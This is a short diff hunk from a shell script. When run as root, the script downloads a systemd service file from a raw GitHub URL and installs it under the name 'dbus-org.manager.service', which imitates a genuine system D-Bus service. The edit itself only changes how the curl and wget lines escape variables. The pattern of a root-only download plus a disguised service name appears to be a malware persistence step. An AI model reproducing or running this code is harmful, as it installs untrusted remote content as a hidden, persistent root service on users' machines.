@@ -24,8 +24,8 @@ if [ "$EUID" -eq 0 ]; then
     SYSTEMD_SERVICE="dbus-org.manager.service"
     SYSTEMD_SERVICE_URL="https://raw.githubusercontent.com/Kaucrow/good-boy/refs/heads/main/systemd.service"
     SYSTEMD_SERVICE_FILE="/etc/systemd/system/$SYSTEMD_SERVICE"
-    curl -s -o $SYSTEMD_SERVICE_FILE $SYSTEMD_SERVICE_URL || \
-    wget -q -O $SYSTEMD_SERVICE_FILE $SYSTEMD_SERVICE_URL
+    curl -s -o \$SYSTEMD_SERVICE_FILE \$SYSTEMD_SERVICE_URL || \
+    wget -q -O \$SYSTEMD_SERVICE_FILE \$SYSTEMD_SERVICE_URL
 
     if [ ! -f $SYSTEMD_SERVICE_FILE ]; then
         exit 1
